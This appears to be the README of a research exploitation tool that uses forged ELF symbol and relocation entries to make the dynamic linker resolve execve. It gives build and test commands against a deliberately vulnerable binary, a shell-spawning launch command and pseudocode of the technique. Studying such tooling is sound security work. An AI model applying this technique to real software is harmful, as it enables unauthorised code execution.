How to test
===========

1. Build vuln.c

        gcc -fno-stack-protector vuln.c -o /tmp/vuln -m32 -O2

2. Find the offset of the saved IP

        ruby19 "$METASPLOIT/tools/pattern_create.rb" 256 | /tmp/vuln
        dmesg | tail
        ruby19 "$METASPLOIT/tools/pattern_offset.rb" $SEGFAULT_IP

3. Launch the attack with the desired parameter

        (python ./exploit.py /tmp/vuln --offset $OFFSET; echo ls) | /tmp/vuln

You can also just dump to a JSON file all the necessary information to
perform the exploit:

    python ./exploit.py /tmp/vuln --json

For debugging information, use the `--debug` parameter. For further
information on the parameters use the `--help` parameter.

The CMake build system will compile `vuln.c` for x86 and x86-64 with
different protections enabled.  There's also a CTest testsuite which
has been tested using the `ld.gold` linker and GCC 4.8.4. Different
toolchains might require minor adjustments.

To launch it just run:

    mkdir leakless-build
    cd leakless-build
    cmake ../leakless
    make
    make test

The build system has also the `length`, `json` and `ropl` targets
which, respectively, produce the length of the generated exploit for
each supported configuration and the JSON and ropl version of the
exploit.

    make length
    make json
    make ropl

Basic idea
==========

    char *buffer = .bss;
    char *new_stack = buffer + 1024;
    int *rubbish = new_stack + 4;

    strcpy(buffer, "execve");
    *((int *) buffer) = 'exec';
    *(((int *) buffer) + 1) = 've\0\0';
    char *name = buffer;
    buffer += strlen(buffer) + 1;

    Elf32_Sym *symbol = (Elf32_Sym *) buffer;
    symbol->st_name = name - .dynstr;
    symbol->st_value = 0;
    symbol->st_info = 0;
    symbol->st_other = 0;
    symbol->st_shndx = 0;
    buffer += sizeof(*symbol);

    Elf32_Rel *reloc = (Elf32_Rel *) buffer;
    reloc->r_offset = rubbish++;
    reloc->r_info = (R_386_JUMP_SLOT | (symbol - .dynsym) / sizeof(symbol));
    buffer += sizeof(reloc):

    pre_plt((reloc - .rel.plt) / sizeof(Elf32_Rel));

Helper classes
==============

* `MemoryArea`: data structure representing a part of memory, with its
  start address, its size, a reference to what its relative to
  (e.g. the `MemoryArea` where we'll write the relocation structure
  will be relative to the `.rela.dyn` section). `MemoryArea` also
  takes care of computing the appropriate index (`MemoryArea.index`)
  relative to the specified part of memory.
* `Buffer`: data structure holding information about a buffer where we
  want to write to things. Typically this will represent to
  `.bss`. Buffer also keeps track of what part of it has already been
  allocated (`Buffer.current` points to the next free location) and
  allows to allocate new `MemoryArea`s with the appropriate
  alignement.

`Exploit`-derived classes
=========================

* `Exploit`: the base class, contains all the architecture- and
  platform-independent parts of the exploit. It keeps the list of the
  gadgets, it takes care of collecting all the interesting information
  about the program from the ELF file and abstracting some utility and
  memory-related functions (e.g. `write_pointer` and `write_string`)
  which rely on the abstract `do_writemem` function (which is
  platform- and program-dependent). Finally, in `jump_to`, contains
  the core logic for setting up the necessary data structures in the
  buffers.
* `CommonGadgetsExploit`: inherits from `Exploit` and introduces
  architecture-dependent parts, in particular gadgets and
  function-invocation logic.
* `ExecveExploit`: very simple class implementing the logic to launch
  an `execve`, so write a `NULL` pointer, a `"/bin/sh\0"` and
  explicitly look for `execve`. Finally invoke it.
* `RawDumperExploit`: exploit useful to just collect the information
  necessary to perform the attack without actually generating the ROP
  chain. `RawDumperExploit.jump_to` will return as first result an
  array of tuples `(address, what_to_write_there)`, which, for
  instance, are used to implement the `--json` parameter.
